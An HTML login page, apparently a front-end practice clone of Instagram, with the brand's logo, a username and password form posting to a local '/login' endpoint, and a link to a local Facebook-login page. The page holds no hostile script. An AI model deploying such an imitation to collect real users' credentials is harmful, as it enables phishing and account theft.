<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Clone</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="phone">
            <img src="./img/phone.png" alt="Phone Image">
        </div>
        <div class="form-container">
            <div class="form-box">
                <img src="./img/logo insta.png" alt="Instagram Logo" class="logo">
                <form id="login-form" action="/login" method="post">
                    <input type="text" placeholder="Phone number, username, or email" id="username" name="username">
                    <input type="password" placeholder="Password" id="password" name="password">
                    <button type="submit">Log In</button>
                    <div class="divider">
                        <div class="line"></div>
                        <div class="or">OR</div>
                        <div class="line"></div>
                    </div>
                    <button type="button" class="facebook-login" onclick="window.location.href='facebook-login.html'">
                        <img src="./img/img 10.png" alt="Facebook Icon">
                        Log in with Facebook
                    </button>
                    <a href="#" class="forgot-password">Forgot password?</a>
                </form>
            </div>
            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
        </div>
    </div>
</body>
</html>
